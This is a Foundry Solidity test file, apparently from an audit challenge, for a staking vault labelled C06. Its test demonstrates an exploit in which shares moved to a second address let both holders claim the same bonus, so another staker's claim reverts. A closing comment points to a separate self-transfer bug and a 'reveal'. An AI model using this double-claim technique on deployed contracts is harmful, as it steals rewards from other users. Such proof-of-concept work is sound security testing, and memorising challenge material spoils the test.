// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C06.sol";
contract C06Test is Test {
    TokenC06 base; TokenC06 bns; StakedShareC06 vault;
    address alice = makeAddr("alice"); address alt = makeAddr("alt"); address carol = makeAddr("carol");
    function setUp() public {
        base = new TokenC06("Base Asset", "BASE"); bns = new TokenC06("Bonus", "BNS");
        vault = new StakedShareC06(base, bns);
        base.mint(alice, 100e18); base.mint(carol, 100e18);
        vm.prank(alice); base.approve(address(vault), type(uint256).max);
        vm.prank(carol); base.approve(address(vault), type(uint256).max);
    }
    function test_exploit_transferDoubleClaimsBonus() public {
        vm.prank(alice); vault.deposit(100e18);
        vm.prank(carol); vault.deposit(100e18);
        bns.mint(address(this), 200e18); bns.approve(address(vault), type(uint256).max);
        vault.distribute(200e18);
        vm.prank(alice); vault.transfer(alt, 100e18);
        vm.prank(alice); uint256 a = vault.claimBonus();
        vm.prank(alt);   uint256 b = vault.claimBonus();
        assertEq(a, 100e18); assertEq(b, 100e18, "alt double-claims the same shares' bonus");
        vm.prank(carol); vm.expectRevert(bytes("balance")); vault.claimBonus();
    }
}
// (Your self-transfer finding is an additional, independent bug in the same _transfer — see reveal 2.)
